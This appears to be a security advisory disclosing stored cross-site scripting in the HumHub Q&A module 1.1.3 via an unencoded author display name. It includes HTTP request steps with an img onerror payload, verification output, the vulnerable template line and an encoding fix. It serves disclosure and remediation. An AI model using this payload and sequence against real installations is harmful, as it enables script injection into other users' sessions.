# HumHub Q&A answer displayName stored XSS

## Summary

HumHub Q&A 1.1.3 contains stored cross-site scripting in answer rendering. The answer view outputs the answer author's displayName inside a strong element without HTML encoding. An authenticated space member can store a crafted profile name and post an answer, causing script execution when another user views the question.

## Affected product

- Vendor/project: **HumHub**
- Product: **Q&A module**
- Affected version: **1.1.3**
- Weakness: **CWE-79**
- CVSS 3.1: `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N (5.4)`
- Verification: **STABLE — 3/3 consecutive fresh runs**

## Researcher

- **Zhong Guangyuan, Fudan University**

## Attack prerequisites and impact

Authenticated space member; victim views a question answered by the attacker.

Verified flow: `profile displayName → answer.createdBy.displayName → raw output inside STRONG`

Successful exploitation permits attacker-controlled markup or script to execute in another user's browser in the affected application origin. The exact privilege and interaction requirements are reflected in the CVSS vector above.

## Reproduction

1. Store an HTML marker in the attacker's profile display name.
2. Join a space and post an answer to a question.
3. Open the question as another user and inspect the answer header DOM.

Sanitized request shape used during verification:

```http
# Space member stores markup in own display name
POST <BASE_URL>/user/account/edit
Cookie: <ATTACKER_SESSION_COOKIE>

_csrf=<CSRF>
Profile[firstname]=<img id=gt481023h4d
Profile[lastname]=src=x onerror=self.x=4>
save=Save profile

POST <BASE_URL>/s/<SPACE_ID>/questions/question/create
Question[question]=gt481023h4d question

POST <BASE_URL>/s/<SPACE_ID>/questions/answer/edit?qid=<QUESTION_ID>
QuestionAnswer[answer]=gt481023h4d answer

GET <BASE_URL>/s/<SPACE_ID>/questions/question/view?id=<QUESTION_ID>
```

Authentication values, private host/IP values, internal identifiers, CSRF values, document keys and one-time tokens are redacted. Parameter names, affected endpoints and payload structure are retained.

## Fresh verification evidence

| Run | Marker | Observation | Result |
| --- | --- | --- | --- |
| 1 | `gt481023h4b` | raw=true; DOM exists=true | **PASS** |
| 2 | `gt481023h4c` | raw=true; DOM exists=true | **PASS** |
| 3 | `gt481023h4d` | raw=true; DOM exists=true | **PASS** |

```text
Saved run-3 browser/HTTP result:
profile_status: 200
answer_status: 200
answer_raw_hit: true
view_status: 200
view_raw_hit: true
browser.exists: true
browser.outerHTML:
<img id="gt481023h4d" src="x" onerror="self.x=4">
ok: true
```

The evidence was generated from a researcher-controlled test deployment. Test records were cleaned after verification.

## Confirmed source and Sink

```text
widgets/views/answer.php:29-38
<div class="questions-answer-header">
    <?= Image::widget([...]) ?>
    <strong><?= $answer->createdBy->displayName ?></strong>
    ...
</div>
```

Root cause: The answer template echoes the author's displayName directly into HTML. No encoder is applied at the output boundary.

## Recommended remediation

Use the framework HTML encoder for displayName, e.g. Html::encode(), before rendering it inside strong.

## References

- Official source: https://github.com/humhub/questions/blob/master/widgets/views/answer.php

## Evidence images

The three public evidence images show, in order:

1. The sanitized reproduction request, endpoint, parameter and payload structure.
2. The three consecutive successful verification runs and exact response/DOM/database excerpts.
3. The highlighted attacker-controlled source and unsafe rendering Sink.

The images are compact reviewer captures rendered from saved raw HTTP/DOM/database evidence. They preserve the verified request, response/DOM evidence, and highlighted source-to-Sink path while redacting credentials and private deployment details.

### Sanitized reproduction

![CAN-17 sanitized reproduction](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-17/01-reproduction-v2.png)

### Three-run success proof

![CAN-17 three-run success proof](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-17/02-success-proof-v2.png)

### Source-to-Sink evidence

![CAN-17 source-to-Sink evidence](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-17/03-source-sink-v2.png)
